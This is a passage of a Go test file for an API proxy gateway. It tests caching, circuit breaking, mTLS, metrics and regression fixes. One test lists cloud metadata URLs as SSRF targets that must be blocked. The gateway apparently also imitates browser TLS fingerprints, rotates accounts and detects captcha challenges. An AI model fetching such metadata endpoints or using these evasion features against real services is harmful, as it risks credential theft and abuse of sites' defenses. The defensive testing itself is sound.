	if hdr != "MISS" || res.CacheHit || upstreamHits.Load() != 2 {
		t.Fatalf("expected no-cache bypass MISS: hdr=%q hit=%v upstreamHits=%d", hdr, res.CacheHit, upstreamHits.Load())
	}

	// 4. Fill capacity=2 with id=2, then insert id=3 -> LRU evicts id=1
	callGW("id=2", false) // upstreamHits = 3; cache holds [2, 1]
	callGW("id=3", false) // upstreamHits = 4; cache holds [3, 2], id=1 evicted!
	hdr, _ = callGW("id=1", false)
	if hdr != "MISS" || upstreamHits.Load() != 5 {
		t.Fatalf("expected id=1 evicted by LRU (max=2): hdr=%q upstreamHits=%d", hdr, upstreamHits.Load())
	}

	// 5. Advance clock past TTL (10s) -> id=1 expires -> MISS
	advanceTime(11 * time.Second)
	hdr, _ = callGW("id=1", false)
	if hdr != "MISS" || upstreamHits.Load() != 6 {
		t.Fatalf("expected TTL expiry MISS: hdr=%q upstreamHits=%d", hdr, upstreamHits.Load())
	}

	// 6. Explicit ClearRouteCache evicts live entry
	mgr.ClearRouteCache("cached-items")
	hdr, _ = callGW("id=1", false)
	if hdr != "MISS" || upstreamHits.Load() != 7 {
		t.Fatalf("expected MISS after ClearRouteCache: hdr=%q upstreamHits=%d", hdr, upstreamHits.Load())
	}

	st := mgr.Stats()
	if st.CacheHits != 1 || st.CacheMisses != 7 {
		t.Fatalf("Stats cache counters = (hits=%d, misses=%d), want (1, 7)", st.CacheHits, st.CacheMisses)
	}
}

func TestCircuitBreakerTransitionsFastFailAndReset(t *testing.T) {
	mgr, err := NewManager(t.TempDir())
	if err != nil {
		t.Fatalf("NewManager: %v", err)
	}
	defer func() { _ = mgr.Shutdown() }()

	var clockMu sync.Mutex
	curTime := time.Date(2026, 11, 25, 13, 0, 0, 0, time.UTC)
	mgr.circuits.now = func() time.Time {
		clockMu.Lock()
		defer clockMu.Unlock()
		return curTime
	}
	advanceTime := func(d time.Duration) {
		clockMu.Lock()
		curTime = curTime.Add(d)
		clockMu.Unlock()
	}

	var failUpstream atomic.Bool
	failUpstream.Store(true)
	var upstreamHits atomic.Int32

	upstream := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		upstreamHits.Add(1)
		if failUpstream.Load() {
			w.WriteHeader(http.StatusInternalServerError)
			_, _ = w.Write([]byte(`{"error":"upstream crash"}`))
			return
		}
		w.Header().Set("Content-Type", "application/json")
		_, _ = w.Write([]byte(`{"ok":true}`))
	}))
	defer upstream.Close()

	_, err = mgr.SaveRoute(ServiceRoute{
		Slug:                 "flaky-api",
		Name:                 "Flaky API",
		Enabled:              true,
		UpstreamMethod:       "GET",
		UpstreamURL:          upstream.URL + "/flaky",
		CircuitFailThreshold: 2,
		CircuitCooldownSec:   30,
	})
	if err != nil {
		t.Fatalf("SaveRoute: %v", err)
	}

	gwSrv := httptest.NewServer(mgr.Handler())
	defer gwSrv.Close()

	// Failures 1 & 2 reach upstream and trip circuit open
	for i := 1; i <= 2; i++ {
		resp, err := gwSrv.Client().Get(gwSrv.URL + "/gw/flaky-api")
		if err != nil {
			t.Fatalf("call %d: %v", i, err)
		}
		resp.Body.Close()
	}
	if upstreamHits.Load() != 2 {
		t.Fatalf("expected 2 upstream hits, got %d", upstreamHits.Load())
	}
	if st := mgr.CircuitStates()["flaky-api"]; st.State != CircuitStateOpen || st.TripCount != 1 {
		t.Fatalf("expected circuit open after 2 failures, got %+v", st)
	}
	if mgr.Stats().OpenCircuits != 1 {
		t.Fatalf("expected OpenCircuits=1, got %d", mgr.Stats().OpenCircuits)
	}

	// Call 3 fails fast with HTTP 503 + X-Cap-Circuit: open WITHOUT calling upstream!
	resp3, err := gwSrv.Client().Get(gwSrv.URL + "/gw/flaky-api")
	if err != nil {
		t.Fatalf("call 3: %v", err)
	}
	var env3 TestInvokeResult
	_ = json.NewDecoder(resp3.Body).Decode(&env3)
	resp3.Body.Close()
	if resp3.StatusCode != http.StatusServiceUnavailable || resp3.Header.Get("X-Cap-Circuit") != "open" || !env3.CircuitTripped {
		t.Fatalf("expected 503 fast-fail with X-Cap-Circuit:open, got status=%d hdr=%q env=%+v",
			resp3.StatusCode, resp3.Header.Get("X-Cap-Circuit"), env3)
	}
	if upstreamHits.Load() != 2 {
		t.Fatalf("open circuit should not contact upstream, hits=%d", upstreamHits.Load())
	}

	// Advance past cooldown -> half_open probe fails -> immediately re-opens!
	advanceTime(31 * time.Second)
	resp4, err := gwSrv.Client().Get(gwSrv.URL + "/gw/flaky-api")
	if err != nil {
		t.Fatalf("call 4 (half_open fail): %v", err)
	}
	resp4.Body.Close()
	if upstreamHits.Load() != 3 {
		t.Fatalf("expected half_open probe to hit upstream, hits=%d", upstreamHits.Load())
	}
	if st := mgr.CircuitStates()["flaky-api"]; st.State != CircuitStateOpen || st.TripCount != 2 {
		t.Fatalf("expected failed half_open probe to re-open circuit, got %+v", st)
	}

	// Advance past cooldown again -> upstream recovers -> half_open probe succeeds -> closed!
	advanceTime(31 * time.Second)
	failUpstream.Store(false)
	resp5, err := gwSrv.Client().Get(gwSrv.URL + "/gw/flaky-api")
	if err != nil {
		t.Fatalf("call 5 (half_open recovery): %v", err)
	}
	var env5 TestInvokeResult
	_ = json.NewDecoder(resp5.Body).Decode(&env5)
	resp5.Body.Close()
	if resp5.StatusCode != http.StatusOK || !env5.OK {
		t.Fatalf("expected recovery 200 OK, got status=%d env=%+v", resp5.StatusCode, env5)
	}
	if st := mgr.CircuitStates()["flaky-api"]; st.State != CircuitStateClosed || st.ConsecutiveFailures != 0 {
		t.Fatalf("expected circuit closed after half_open success, got %+v", st)
	}

	// Trip again and test manual ResetCircuit
	failUpstream.Store(true)
	_, _ = mgr.InvokeRoute(context.Background(), "flaky-api", TestInvokeRequest{})
	_, _ = mgr.InvokeRoute(context.Background(), "flaky-api", TestInvokeRequest{})
	if mgr.CircuitStates()["flaky-api"].State != CircuitStateOpen {
		t.Fatalf("expected circuit re-opened before manual reset")
	}
	mgr.ResetCircuit("flaky-api")
	if st := mgr.CircuitStates()["flaky-api"]; st.State != CircuitStateClosed {
		t.Fatalf("expected circuit closed after ResetCircuit, got %+v", st)
	}
}

func generateTestMTLSBundle(t *testing.T, dir string) (caPool *x509.CertPool, serverCert tls.Certificate, clientCertPath, clientKeyPath string) {
	t.Helper()

	caKey, err := ecdsa.GenerateKey(elliptic.P256(), rand.Reader)
	if err != nil {
		t.Fatalf("generate CA key: %v", err)
	}
	caTmpl := &x509.Certificate{
		SerialNumber:          big.NewInt(1),
		Subject:               pkix.Name{CommonName: "cap-test-ca"},
		NotBefore:             time.Now().Add(-time.Hour),
		NotAfter:              time.Now().Add(24 * time.Hour),
		KeyUsage:              x509.KeyUsageCertSign | x509.KeyUsageCRLSign,
		BasicConstraintsValid: true,
		IsCA:                  true,
	}
	caDER, err := x509.CreateCertificate(rand.Reader, caTmpl, caTmpl, &caKey.PublicKey, caKey)
	if err != nil {
		t.Fatalf("create CA cert: %v", err)
	}
	caCert, err := x509.ParseCertificate(caDER)
	if err != nil {
		t.Fatalf("parse CA cert: %v", err)
	}
	caPool = x509.NewCertPool()
	caPool.AddCert(caCert)

	issue := func(serial int64, cn string, eku x509.ExtKeyUsage, ips []net.IP) (tls.Certificate, []byte, []byte) {
		key, err := ecdsa.GenerateKey(elliptic.P256(), rand.Reader)
		if err != nil {
			t.Fatalf("generate key %s: %v", cn, err)
		}
		tmpl := &x509.Certificate{
			SerialNumber: big.NewInt(serial),
			Subject:      pkix.Name{CommonName: cn},
			NotBefore:    time.Now().Add(-time.Hour),
			NotAfter:     time.Now().Add(24 * time.Hour),
			KeyUsage:     x509.KeyUsageDigitalSignature,
			ExtKeyUsage:  []x509.ExtKeyUsage{eku},
			IPAddresses:  ips,
			DNSNames:     []string{"localhost"},
		}
		der, err := x509.CreateCertificate(rand.Reader, tmpl, caCert, &key.PublicKey, caKey)
		if err != nil {
			t.Fatalf("create cert %s: %v", cn, err)
		}
		certPEM := pem.EncodeToMemory(&pem.Block{Type: "CERTIFICATE", Bytes: der})
		keyDER, err := x509.MarshalECPrivateKey(key)
		if err != nil {
			t.Fatalf("marshal key %s: %v", cn, err)
		}
		keyPEM := pem.EncodeToMemory(&pem.Block{Type: "EC PRIVATE KEY", Bytes: keyDER})
		pair, err := tls.X509KeyPair(certPEM, keyPEM)
		if err != nil {
			t.Fatalf("X509KeyPair %s: %v", cn, err)
		}
		return pair, certPEM, keyPEM
	}

	serverCert, _, _ = issue(2, "127.0.0.1", x509.ExtKeyUsageServerAuth, []net.IP{net.ParseIP("127.0.0.1")})
	_, clientCertPEM, clientKeyPEM := issue(3, "cap-gateway-mtls-client", x509.ExtKeyUsageClientAuth, nil)

	clientCertPath = filepath.Join(dir, "client.crt")
	clientKeyPath = filepath.Join(dir, "client.key")
	if err := os.WriteFile(clientCertPath, clientCertPEM, 0o600); err != nil {
		t.Fatalf("write client.crt: %v", err)
	}
	if err := os.WriteFile(clientKeyPath, clientKeyPEM, 0o600); err != nil {
		t.Fatalf("write client.key: %v", err)
	}
	return caPool, serverCert, clientCertPath, clientKeyPath
}

func TestTLSProfilesAndRealMTLSHandshake(t *testing.T) {
	// 1. Validate all 6 TLS profiles build distinct, valid *tls.Config instances
	for _, prof := range []string{
		TLSProfileGoDefault,
		TLSProfileChrome131,
		TLSProfileSafari17,
		TLSProfileFirefox132,
		TLSProfileOkHttpAndroid,
		TLSProfileIOSCFNetwork,
	} {
		cfg, err := BuildTLSConfig(prof, "", "", nil)
		if err != nil {
			t.Fatalf("BuildTLSConfig(%q): %v", prof, err)
		}
		if prof != TLSProfileGoDefault {
			if len(cfg.CipherSuites) == 0 || len(cfg.CurvePreferences) == 0 || len(cfg.NextProtos) == 0 {
				t.Fatalf("profile %q missing curated TLS parameters: %+v", prof, cfg)
			}
		}
	}
	if _, err := BuildTLSConfig("unknown_browser", "", "", nil); err == nil {
		t.Fatalf("expected error for unknown TLS profile")
	}
	if _, err := BuildTLSConfig(TLSProfileChrome131, "/tmp/only-cert.pem", "", nil); err == nil {
		t.Fatalf("expected error when only mtls_cert_path is set")
	}

	// 2. Real mutual-TLS handshake against httptest.NewUnstartedServer
	certDir := t.TempDir()
	caPool, serverCert, clientCertPath, clientKeyPath := generateTestMTLSBundle(t, certDir)

	mtlsSrv := httptest.NewUnstartedServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		cn := ""
		if r.TLS != nil && len(r.TLS.PeerCertificates) > 0 {
			cn = r.TLS.PeerCertificates[0].Subject.CommonName
		}
		w.Header().Set("Content-Type", "application/json")
		_ = json.NewEncoder(w).Encode(map[string]any{
			"mtls_cn": cn,
			"proto":   r.Proto,
		})
	}))
	mtlsSrv.EnableHTTP2 = true
	mtlsSrv.TLS = &tls.Config{
		Certificates: []tls.Certificate{serverCert},
		ClientAuth:   tls.RequireAndVerifyClientCert,
		ClientCAs:    caPool,
		MinVersion:   tls.VersionTLS12,
	}
	mtlsSrv.StartTLS()
	defer mtlsSrv.Close()

	mgr, err := NewManager(t.TempDir())
	if err != nil {
		t.Fatalf("NewManager: %v", err)
	}
	defer func() { _ = mgr.Shutdown() }()
	mgr.SetUpstreamRootCAs(caPool)

	// Route without mTLS client cert must fail mutual-TLS handshake
	_, err = mgr.SaveRoute(ServiceRoute{
		Slug:           "mtls-missing-cert",
		Name:           "mTLS Missing Cert",
		Enabled:        true,
		UpstreamMethod: "GET",
		UpstreamURL:    mtlsSrv.URL + "/secure",
		TLSProfile:     TLSProfileChrome131,
	})
	if err != nil {
		t.Fatalf("SaveRoute mtls-missing-cert: %v", err)
	}
	if res, invErr := mgr.InvokeRoute(context.Background(), "mtls-missing-cert", TestInvokeRequest{}); invErr == nil || (res != nil && res.OK) {
		t.Fatalf("expected handshake failure without client cert, got err=%v res=%+v", invErr, res)
	}

	// Route WITH mTLS client cert + okhttp_android TLS profile succeeds
	_, err = mgr.SaveRoute(ServiceRoute{
		Slug:           "mtls-ok",
		Name:           "mTLS OK",
		Enabled:        true,
		UpstreamMethod: "GET",
		UpstreamURL:    mtlsSrv.URL + "/secure",
		TLSProfile:     TLSProfileOkHttpAndroid,
		MTLSCertPath:   clientCertPath,
		MTLSKeyPath:    clientKeyPath,
	})
	if err != nil {
		t.Fatalf("SaveRoute mtls-ok: %v", err)
	}
	res, err := mgr.InvokeRoute(context.Background(), "mtls-ok", TestInvokeRequest{})
	if err != nil || !res.OK {
		t.Fatalf("InvokeRoute mtls-ok failed: err=%v res=%+v", err, res)
	}
	dm, _ := res.Data.(map[string]any)
	if dm["mtls_cn"] != "cap-gateway-mtls-client" {
		t.Fatalf("expected verified client cert CN cap-gateway-mtls-client, got %+v", dm)
	}
	if res.TLSProfile != TLSProfileOkHttpAndroid {
		t.Fatalf("expected TLSProfile=%q, got %q", TLSProfileOkHttpAndroid, res.TLSProfile)
	}
}

func TestPrometheusMetricsExpositionAndDockerExport(t *testing.T) {
	mgr, err := NewManager(t.TempDir())
	if err != nil {
		t.Fatalf("NewManager: %v", err)
	}
	defer func() { _ = mgr.Shutdown() }()

	var failMode atomic.Bool
	upstream := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if failMode.Load() {
			w.WriteHeader(http.StatusBadGateway)
			return
		}
		w.Header().Set("Content-Type", "application/json")
		_, _ = w.Write([]byte(`{"status":"ok"}`))
	}))
	defer upstream.Close()

	_, _ = mgr.SaveAccount(AccountProfile{ID: "a1", Name: "Active Acc", Enabled: true, Status: AccountStatusActive})
	_, _ = mgr.CreateDeviceFromPreset("pixel-8-pro", "Prom Device", nil)
	_, _ = mgr.SaveRoute(ServiceRoute{
		Slug:                 "prom-route",
		Name:                 "Prom Route",
		Enabled:              true,
		UpstreamMethod:       "GET",
		UpstreamURL:          upstream.URL + "/ok",
		CacheTTLSec:          30,
		CircuitFailThreshold: 1,
		CircuitCooldownSec:   60,
	})

	// Cache miss + cache hit
	_, _ = mgr.InvokeRoute(context.Background(), "prom-route", TestInvokeRequest{})
	_, _ = mgr.InvokeRoute(context.Background(), "prom-route", TestInvokeRequest{})

	// Trip circuit on a second route
	_, _ = mgr.SaveRoute(ServiceRoute{
		Slug:                 "tripped-route",
		Name:                 "Tripped Route",
		Enabled:              true,
		UpstreamMethod:       "GET",
		UpstreamURL:          upstream.URL + "/fail",
		CircuitFailThreshold: 1,
		CircuitCooldownSec:   60,
	})
	failMode.Store(true)
	_, _ = mgr.InvokeRoute(context.Background(), "tripped-route", TestInvokeRequest{})

	// Enforce auth on /metrics/prometheus
	_ = mgr.UpdateConfig(GatewayConfig{
		ListenAddr:  "127.0.0.1:9191",
		RequireAuth: true,
		APIKeys:     []string{"prom-secret-key"},
	})

	gwSrv := httptest.NewServer(mgr.Handler())
	defer gwSrv.Close()

	unauthResp, err := gwSrv.Client().Get(gwSrv.URL + "/metrics/prometheus")
	if err != nil {
		t.Fatalf("unauth /metrics/prometheus: %v", err)
	}
	unauthResp.Body.Close()
	if unauthResp.StatusCode != http.StatusUnauthorized {
		t.Fatalf("expected 401 without API key, got %d", unauthResp.StatusCode)
	}

	req, _ := http.NewRequest(http.MethodGet, gwSrv.URL+"/metrics/prometheus", nil)
	req.Header.Set("X-API-Key", "prom-secret-key")
	resp, err := gwSrv.Client().Do(req)
	if err != nil {
		t.Fatalf("auth /metrics/prometheus: %v", err)
	}
	bodyBytes, _ := io.ReadAll(resp.Body)
	resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		t.Fatalf("/metrics/prometheus status = %d, want 200", resp.StatusCode)
	}
	if ct := resp.Header.Get("Content-Type"); !strings.Contains(ct, "text/plain; version=0.0.4") {
		t.Fatalf("Content-Type = %q, want text/plain; version=0.0.4", ct)
	}

	body := string(bodyBytes)
	requiredLines := []string{
		"# TYPE cap_gateway_requests_total counter",
		"cap_gateway_requests_total 3",
		"# TYPE cap_gateway_errors_total counter",
		"cap_gateway_errors_total 1",
		"cap_gateway_cache_hits_total 1",
		"cap_gateway_cache_misses_total 1",
		"# TYPE cap_gateway_latency_ms_avg gauge",
		"cap_gateway_proxies_healthy 0",
		"cap_gateway_devices_active 1",
		"cap_gateway_accounts_active 1",
		"cap_gateway_workers_healthy 0",
		`cap_gateway_route_circuit_state{route="prom-route"} 0`,
		`cap_gateway_route_circuit_state{route="tripped-route"} 1`,
	}
	for _, want := range requiredLines {
		if !strings.Contains(body, want) {
			t.Fatalf("Prometheus output missing %q\nfull output:\n%s", want, body)
		}
	}

	// Headless Docker deployment export
	bundle := mgr.ExportDockerBundle("")
	if bundle.ListenAddr != "127.0.0.1:9191" {
		t.Fatalf("ExportDockerBundle ListenAddr = %q, want 127.0.0.1:9191", bundle.ListenAddr)
	}
	for _, want := range []string{"FROM golang:", "EXPOSE 9191", `"gateway", "serve", "--addr", "0.0.0.0:9191"`, "HEALTHCHECK"} {
		if !strings.Contains(bundle.Dockerfile, want) {
			t.Fatalf("Dockerfile missing %q:\n%s", want, bundle.Dockerfile)
		}
	}
	for _, want := range []string{"cap-gateway:", `"9191:9191"`, "gateway", "serve", "http://127.0.0.1:9191/health"} {
		if !strings.Contains(bundle.DockerCompose, want) {
			t.Fatalf("DockerCompose missing %q:\n%s", want, bundle.DockerCompose)
		}
	}
}

func TestProRegressionsAuditFixes(t *testing.T) {
	// 1. Concurrent WorkerPool.AcquireHealthyEndpoint stress (zero divide-by-zero / races)
	t.Run("AcquireHealthyEndpointConcurrentStress", func(t *testing.T) {
		pool := NewWorkerPool("")
		spec := ManagedWorkerSpec{
			ID:        "wp-stress",
			Name:      "Stress Workers",
			Kind:      WorkerKindCustom,
			Command:   "true",
			BasePort:  41000,
			Instances: 4,
			Enabled:   true,
		}
		if _, err := pool.SaveSpec(spec); err != nil {
			t.Fatalf("SaveSpec: %v", err)
		}
		// Reject negative Instances
		badSpec := spec
		badSpec.ID = "wp-neg"
		badSpec.Instances = -2
		if _, err := pool.SaveSpec(badSpec); err == nil {
			t.Fatalf("expected error for negative Instances")
		}

		// Attach synthetic running/healthy runtime to stress AcquireHealthyEndpoint directly.
		ctx, cancel := context.WithCancel(context.Background())
		defer cancel()
		rt := &workerRuntime{
			spec:      spec,
			ctx:       ctx,
			cancel:    cancel,
			instances: make([]*managedInstanceState, 4),
		}
		for i := range 4 {
			rt.instances[i] = &managedInstanceState{
				index:   i,
				port:    41000 + i,
				signURL: fmt.Sprintf("http://127.0.0.1:%d/sign", 41000+i),
				running: true,
				healthy: true,
				stderr:  newTailBuffer(256),
			}
		}
		pool.mu.Lock()
		pool.runtimes[spec.ID] = rt
		pool.mu.Unlock()

		var wg sync.WaitGroup
		for range 32 {
			wg.Add(1)
			go func() {
				defer wg.Done()
				for range 200 {
					ep, rel, err := pool.AcquireHealthyEndpoint(spec.ID)
					if err != nil || ep == "" {
						t.Errorf("AcquireHealthyEndpoint failed: ep=%q err=%v", ep, err)
						return
					}
					rel()
				}
			}()
		}
		wg.Wait()
	})

	// 2. Half-open circuit breaker pre-upstream failure must NOT permanently wedge circuit
	t.Run("CircuitBreakerHalfOpenPreUpstreamAbortRecovers", func(t *testing.T) {
		mgr, err := NewManager(t.TempDir())
		if err != nil {
			t.Fatalf("NewManager: %v", err)
		}
		defer func() { _ = mgr.Shutdown() }()

		var clockMu sync.Mutex
		curTime := time.Date(2026, 11, 25, 14, 0, 0, 0, time.UTC)
		mgr.circuits.now = func() time.Time {
			clockMu.Lock()
			defer clockMu.Unlock()
			return curTime
		}

		var failUpstream atomic.Bool
		failUpstream.Store(true)
		upstream := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
			if failUpstream.Load() {
				w.WriteHeader(http.StatusInternalServerError)
				return
			}
			w.WriteHeader(http.StatusOK)
			_, _ = w.Write([]byte(`{"recovered":true}`))
		}))
		defer upstream.Close()

		_, err = mgr.SaveRoute(ServiceRoute{
			Slug:                 "halfopen-abort",
			Name:                 "HalfOpen Abort",
			Enabled:              true,
			UpstreamMethod:       "GET",
			UpstreamURL:          upstream.URL + "/api",
			CircuitFailThreshold: 1,
			CircuitCooldownSec:   10,
		})
		if err != nil {
			t.Fatalf("SaveRoute: %v", err)
		}

		// Trip circuit open
		_, _ = mgr.InvokeRoute(context.Background(), "halfopen-abort", TestInvokeRequest{})
		if st := mgr.CircuitStates()["halfopen-abort"]; st.State != CircuitStateOpen || st.TripCount != 1 {
			t.Fatalf("expected open circuit with tripCount=1, got %+v", st)
		}

		// Advance past cooldown, then invoke with a missing pinned DeviceID -> aborts BEFORE upstream!
		clockMu.Lock()
		curTime = curTime.Add(15 * time.Second)
		clockMu.Unlock()

		resAbort, invErr := mgr.InvokeRoute(context.Background(), "halfopen-abort", TestInvokeRequest{
			DeviceID: "non-existent-device",
		})
		if invErr == nil || resAbort == nil || resAbort.CircuitTripped {
			t.Fatalf("expected device acquisition error (not circuit trip), got err=%v res=%+v", invErr, resAbort)
		}

		// Circuit must NOT be wedged in half_open; OpenCount stays 1 and next valid request recovers!
		if st := mgr.CircuitStates()["halfopen-abort"]; st.State != CircuitStateOpen {
			t.Fatalf("expected circuit reverted to open (not wedged half_open), got %+v", st)
		}
		if mgr.Stats().OpenCircuits != 1 {
			t.Fatalf("expected OpenCircuits=1, got %d", mgr.Stats().OpenCircuits)
		}

		failUpstream.Store(false)
		resOK, err := mgr.InvokeRoute(context.Background(), "halfopen-abort", TestInvokeRequest{})
		if err != nil || !resOK.OK {
			t.Fatalf("expected recovery after pre-upstream abort, got err=%v res=%+v", err, resOK)
		}
		if st := mgr.CircuitStates()["halfopen-abort"]; st.State != CircuitStateClosed {
			t.Fatalf("expected circuit closed after recovery, got %+v", st)
		}
	})

	// 3. RouteCache deep-clones res.Data + BuildCacheKey falls through JSON body to Headers
	t.Run("RouteCacheDataIsolationAndJSONBodyHeaderKeyFallback", func(t *testing.T) {
		mgr, err := NewManager(t.TempDir())
		if err != nil {
			t.Fatalf("NewManager: %v", err)
		}
		defer func() { _ = mgr.Shutdown() }()

		var hits atomic.Int32
		upstream := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
			n := hits.Add(1)
			w.Header().Set("Content-Type", "application/json")
			_ = json.NewEncoder(w).Encode(map[string]any{
				"tenant": r.Header.Get("X-Tenant"),
				"hit":    n,
				"nested": map[string]any{"items": []any{"a", "b"}},
			})
		}))
		defer upstream.Close()

		_, err = mgr.SaveRoute(ServiceRoute{
			Slug:           "cache-isolation",
			Name:           "Cache Isolation",
			Enabled:        true,
			UpstreamMethod: "POST",
			UpstreamURL:    upstream.URL + "/items",
			CacheTTLSec:    60,
			CacheKeyFields: []string{"item", "X-Tenant"},
		})
		if err != nil {
			t.Fatalf("SaveRoute: %v", err)
		}

		// Request 1 (tenant-a) -> MISS
		res1, err := mgr.InvokeRoute(context.Background(), "cache-isolation", TestInvokeRequest{
			Body:    `{"item":"book"}`,
			Headers: map[string]string{"X-Tenant": "tenant-a"},
		})
		if err != nil || res1.CacheHit {
			t.Fatalf("expected MISS on res1: err=%v res=%+v", err, res1)
		}
		// Mutate res1.Data in-place; cache must remain unaffected!
		m1 := res1.Data.(map[string]any)
		m1["tenant"] = "CORRUPTED-BY-MISS-CALLER"
		m1["nested"].(map[string]any)["items"].([]any)[0] = "MUTATED"

		// Request 2 (tenant-a) -> HIT with pristine data
		res2, err := mgr.InvokeRoute(context.Background(), "cache-isolation", TestInvokeRequest{
			Body:    `{"item":"book"}`,
			Headers: map[string]string{"X-Tenant": "tenant-a"},
		})
		if err != nil || !res2.CacheHit {
			t.Fatalf("expected HIT on res2: err=%v res=%+v", err, res2)
		}
		m2 := res2.Data.(map[string]any)
		if m2["tenant"] != "tenant-a" || m2["nested"].(map[string]any)["items"].([]any)[0] != "a" {
			t.Fatalf("cache data was mutated by previous caller: %+v", m2)
		}
		// Mutate res2.Data as well and verify a third HIT is still isolated
		m2["tenant"] = "CORRUPTED-BY-HIT-CALLER"
		res3, err := mgr.InvokeRoute(context.Background(), "cache-isolation", TestInvokeRequest{
			Body:    `{"item":"book"}`,
			Headers: map[string]string{"X-Tenant": "tenant-a"},
		})
		if err != nil || !res3.CacheHit || res3.Data.(map[string]any)["tenant"] != "tenant-a" {
			t.Fatalf("cache data was mutated by HIT caller: err=%v res=%+v", err, res3)
		}

		// Request 4 (same JSON body, DIFFERENT X-Tenant header) -> MUST MISS (proves header fallback works!)
		res4, err := mgr.InvokeRoute(context.Background(), "cache-isolation", TestInvokeRequest{
			Body:    `{"item":"book"}`,
			Headers: map[string]string{"X-Tenant": "tenant-b"},
		})
		if err != nil || res4.CacheHit || hits.Load() != 2 {
			t.Fatalf("expected separate cache key for X-Tenant=tenant-b with JSON body: err=%v hit=%v upstreamHits=%d",
				err, res4.CacheHit, hits.Load())
		}
		if res4.Data.(map[string]any)["tenant"] != "tenant-b" {
			t.Fatalf("unexpected tenant in res4: %+v", res4.Data)
		}
	})

	// 4. Chained refresh routes with MaxRefreshAttempts=2 must NOT deadlock RefreshSingleflight
	t.Run("ChainedRefreshNonDeadlockAndMarkHealthyClearsExpiry", func(t *testing.T) {
		mgr, err := NewManager(t.TempDir())
		if err != nil {
			t.Fatalf("NewManager: %v", err)
		}
		defer func() { _ = mgr.Shutdown() }()

		if err := mgr.UpdateAccountConfig(AccountPoolConfig{
			Strategy: StrategyRoundRobin,
			Refresh: AccountRefreshConfig{
				MaxRefreshAttempts: 2,
			},
		}); err != nil {
			t.Fatalf("UpdateAccountConfig: %v", err)
		}

		upstream := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
			w.WriteHeader(http.StatusUnauthorized)
			_, _ = w.Write([]byte(`{"error":"always unauthorized"}`))
		}))
		defer upstream.Close()

		acc, err := mgr.SaveAccount(AccountProfile{
			ID:        "acc-chain-1",
			Name:      "Chain Account",
			Token:     "chain-old-token",
			Enabled:   true,
			Status:    AccountStatusActive,
			ExpiresAt: time.Now().UTC().Add(-5 * time.Minute).Format(time.RFC3339),
		})
		if err != nil {
			t.Fatalf("SaveAccount: %v", err)
		}
		// MarkHealthy clears past ExpiresAt so healed account becomes acquirable
		if err := mgr.AccountPool().MarkHealthy(acc.ID); err != nil {
			t.Fatalf("MarkHealthy: %v", err)
		}
		if _, err := mgr.AccountPool().Acquire(AccountSelectOptions{ExplicitID: acc.ID}); err != nil {
			t.Fatalf("expected healed account with cleared past ExpiresAt to be acquirable: %v", err)
		}

		_, _ = mgr.SaveRoute(ServiceRoute{
			Slug:             "refresh-hop-2",
			Name:             "Refresh Hop 2",
			Enabled:          true,
			UpstreamMethod:   "POST",
			UpstreamURL:      upstream.URL + "/r2",
			AutoRefresh:      true,
			RefreshRouteSlug: "refresh-hop-1",
		})
		_, _ = mgr.SaveRoute(ServiceRoute{
			Slug:             "refresh-hop-1",
			Name:             "Refresh Hop 1",
			Enabled:          true,
			UpstreamMethod:   "POST",
			UpstreamURL:      upstream.URL + "/r1",
			AutoRefresh:      true,
			RefreshRouteSlug: "refresh-hop-2",
		})
		_, _ = mgr.SaveRoute(ServiceRoute{
			Slug:             "api-chained",
			Name:             "API Chained",
			Enabled:          true,
			UpstreamMethod:   "GET",
			UpstreamURL:      upstream.URL + "/api",
			RequireAccount:   true,
			AutoRefresh:      true,
			RefreshRouteSlug: "refresh-hop-1",
		})

		done := make(chan struct{})
		go func() {
			defer close(done)
			res, _ := mgr.InvokeRoute(context.Background(), "api-chained", TestInvokeRequest{AccountID: acc.ID})
			if res == nil || res.Status != http.StatusUnauthorized {
				t.Errorf("expected 401 response after chained refresh guard, got %+v", res)
			}
		}()

		select {
		case <-done:
		case <-time.After(3 * time.Second):
			t.Fatalf("chained refresh with MaxRefreshAttempts=2 deadlocked RefreshSingleflight!")
		}
	})

	// 5. Account secret redaction in UpstreamURL/logs/webhooks + webhook redirect & trailing-dot SSRF blocking
	t.Run("SecretRedactionInURLAndWebhookSSRFRedirectBlocking", func(t *testing.T) {
		mgr, err := NewManager(t.TempDir())
		if err != nil {
			t.Fatalf("NewManager: %v", err)
		}
		defer func() { _ = mgr.Shutdown() }()

		const (
			tokSecret    = "SuperSecretTok_987654321"
			csrfSecret   = "CsrfSecretVal_ABCDEF"
			cookieSecret = "CookieSecretVal_XYZ123"
		)

		// Trailing-dot metadata host must be blocked
		for _, bad := range []string{
			"http://metadata.google.internal./computeMetadata/v1",
			"http://metadata.goog./v1",
			"http://169.254.169.254/latest/meta-data",
			"http://0.0.0.0:8080/hook",
		} {
			if _, err := validateWebhookURL(bad); err == nil {
				t.Fatalf("expected SSRF webhook URL %q to be blocked", bad)
			}
		}

		// Redirect SSRF bounce must NOT be followed by sendChallengeWebhook
		var redirectTargetHits atomic.Int32
		redirectTarget := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
			redirectTargetHits.Add(1)
			w.WriteHeader(http.StatusOK)
		}))
		defer redirectTarget.Close()

		redirector := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
			http.Redirect(w, r, redirectTarget.URL+"/stolen", http.StatusFound)
		}))
		defer redirector.Close()

		client, tr := newWebhookHTTPClient()
		defer tr.CloseIdleConnections()
		if err := sendChallengeWebhook(context.Background(), client, redirector.URL+"/hook", challengeWebhookPayload{
			Event: "gateway.challenge_detected", RouteSlug: "test", Reason: "captcha",
		}, nil); err != nil {
			t.Fatalf("sendChallengeWebhook to redirector returned unexpected error: %v", err)
		}
		if redirectTargetHits.Load() != 0 {
			t.Fatalf("webhook client followed redirect to %s (%d hits), want 0", redirectTarget.URL, redirectTargetHits.Load())
		}

		// Build a challenge body where tokSecret straddles byte 256!
		straddleBody := strings.Repeat("x", 248) + tokSecret + " captcha_required " + cookieSecret
		upstream := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
